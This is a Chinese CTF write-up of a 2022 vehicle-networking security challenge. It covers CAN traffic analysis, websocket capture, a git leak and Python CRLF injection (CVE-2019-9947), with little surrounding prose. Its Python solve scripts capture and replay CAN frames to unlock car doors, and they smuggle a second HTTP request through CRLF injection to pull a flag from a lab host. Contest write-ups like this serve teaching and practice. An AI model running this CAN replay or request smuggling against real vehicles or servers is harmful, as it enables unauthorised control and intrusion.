# 【WP】2022数字中国创新大赛车联网安全赛 best_agent|设计思路与解析

> 原文: https://www.ctfiot.com/36300.html
> ID: 36300

本文由 伽玛实验室-mldwyy 小姐姐提供，赛后将该题设计思路及解法公开供大家学习交流。

大赛背景介绍
2022年数字中国创新大赛网络安全赛道-车联网安全竞赛线上赛已经圆满结束。本届赛事由数字中国建设峰会指导，福建省通信管理局主办，中国信息通信研究院承办，永信至诚-伽玛实验室为大赛提供技术支持。

CAN 流量分析

websocket 流量获取

git信息泄露

python CRLF 注入 CVE-2019-9947

Apache HTTPD 请求头解析futrue

结语

好兄弟色豹所创办的IOTsec-Zone社区，专注于物联网安全领域，秉承“专业、创新、自由、开放”的精神，旨在建立高质量、高标准的沉浸式体验社区，为大家提供一个行业信息和技术交流的开放性平台。

https://iotsec-zone.com/

春秋伽玛实验室由一群“因为热爱CTF并希望以一己之力改变世界人所构成”，希望大家未来多多参加永信至诚所举办的比赛。未来车联网赛题将可以在i春秋的CTF大本营中训练，尽情期待。

– 未完待续 –

春秋GAME伽玛实验室

会定期分享赛题赛制设计、解题思路……

如果你日常有一些技术研究和好的设计思路

或在赛后对某道题有另辟蹊径的想法

欢迎找到春秋GAME投稿哦～

联系vx:
cium0309

欢迎加入 春秋GAME CTF交流2群

Q群:
703460426


```
1.硬件方案的软件化实现，简化了设计，降低了成本，且在数据更新增加新信息时，只需软件升级即可，扩充性强;
2.控制单元对所传输的信息进行实时检测，具有错误诊断能力和自动恢复能力，节省生产维护成本;
3.CAN总线符合国际标准，因此可应用不同型号控制单元间的数据传输;
4.数据共享减少了数据的重复处理，节省成本。如对于具有CAN总线接口的电喷发动机，其它电器可共享其提供的转速、水温、机油压力温度等，可省去额外的水温、油压、油温传感器。
1.探索页面提供http方式触发操作，并且返回流量
2.逃跑页面提供个websocket方式触发操作
触发动作 -- > 获取流量 –-> 提交流量
ws = websocket.WebSocketApp("ws://ip:
port/test/log",
              on_message=on_message,
              )
ws.run_forever()
在我们调用开右车门接口后，在CAN流量中可看到发出开右车门的请求流量，所以我们需多次调用开右车的接口，在后续流量中一直重复出现的那个，即为开右车门的请求流量。
import websocket
import eventlet
import requests
payload_list = []

eventlet.monkey_patch()

run_counts = 0

max_counts = 20

do_it = False

max_round = 5
url="192.168.244.133:
7410"

def on_message(ws, message):
    global max_counts
    global do_it
    global max_round
    global url

    if not do_it and max_counts > 0:
        max_counts = max_counts - 1

    if max_counts == 0:
        if not do_it:
            with requests.get(f"http://{url}/test/control?op=open_left") as f:
                print(f.text)
        do_it = not do_it
        max_counts = 20
        max_round = max_round - 1

    if do_it and max_counts > 0:
        with open(f"test/after_{max_round}.log", "a+") as f:
            f.write(message)
            max_counts = max_counts - 1
    with open(f"test/after_{run_counts}.log","a+") as f:
        f.write(message)

ws = websocket.WebSocketApp(f"ws://{url}/test/log",
                            on_message=on_message,
                            )
ws.run_forever()
import websocket
import time

payload_list = []

def on_message(ws, message):
    print(message)
    time.sleep(1)
    if len(payload_list) > 0:
        c = payload_list.pop()
        ws.send(c)

def on_error(ws, error):
    print(ws)
    print(error)

def on_close(ws):
    print(ws)
    print("### closed ###")

def payload():
    c = '17E#00000E000000'
    print(c)
    payload_list.append(c)

    c = '17E#00000D000000'
    print(c)
    payload_list.append(c)

    c = '17E#00000D000000'
    print(c)
    payload_list.append(c)

    c = '17E#00000F000000'
    print(c)
    payload_list.append(c)

    c = "244#000000502D"
    print(c)
    payload_list.append(c)

    c = '19A#01000000'
    print(c)
    payload_list.append(c)

    c = "244#00000050"
    print(c)
    payload_list.append(c)

    c = '19A#02000000'
    print(c)
    payload_list.append(c)

    payload_list.append("244#00000050")

    payload_list.append("get")

    payload_list.reverse()

url = "192.168.244.133:
7410"
ws = websocket.WebSocketApp(f"ws://{url}/hack/control",
                            on_message=on_message,
                            on_error=on_error,
                            on_close=on_close)
if __name__ == '__main__':
    payload()
    ws.run_forever()
import urllib.error
import urllib.request
from urllib.parse import quote

import requests

txt = """/oen HTTP/1.1
Host: 127.0.0.1

POST /index.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 39  

{"get_flag_is_a_beautiful_thing":"yes"}

"""
url = "192.168.244.133:
7410"#sys.argv[1]

if __name__ == '__main__':
    try:
        text = quote(txt, 'utf-8')
        text = text.replace("%0A", "%0D%0A")
        print("http://{url}/fetch/api?action="+text)
        with requests.get(f"http://{url}/fetch/api?action="+text) as rep:
            print(rep.text)
        with requests.get(f"http://{url}/fetch/api?action=flag") as rep:
            print(rep.text)
    
except urllib.error.URLError as e:
        print(e)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/4-1650021123.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/8-1650021124.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/5-1650021125.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/1-1650021126.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/3-1650021126.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/2-1650021126.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/10-1650021127.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/8-1650021127.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/9-1650021128.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/04/8-1650021128.png)